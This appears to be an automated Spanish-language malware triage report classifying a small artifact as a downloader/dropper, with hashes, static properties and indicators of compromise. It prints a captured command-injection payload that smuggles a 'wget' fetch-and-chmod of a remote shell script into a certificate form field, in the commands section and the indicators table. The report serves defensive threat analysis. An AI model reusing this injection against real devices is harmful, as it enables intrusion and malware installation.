# 🧬 Payload Analysis

`041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:01:00+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8`
- **SHA1:** `ad95acd8bff363144e4ba5e39bd0c96b6e9ce790`
- **MD5:** `4c4e20a244b2c4997947cad94aabf43e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 253 B |
| Entropía | 5.45 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 154.168.179.XXX | static_analysis |
| ip | 89.32.41.XXX | static_analysis |
| url | hxxp://89.32.41.XXX/bins/kla.sh | strings |
| hash | 041443cda3e9eb2e44715c3a88abe36197216b8a5c14398ee57dbfac933190a8 | static_analysis |
| command | action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x | strings |
| ip | 85.103.42.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
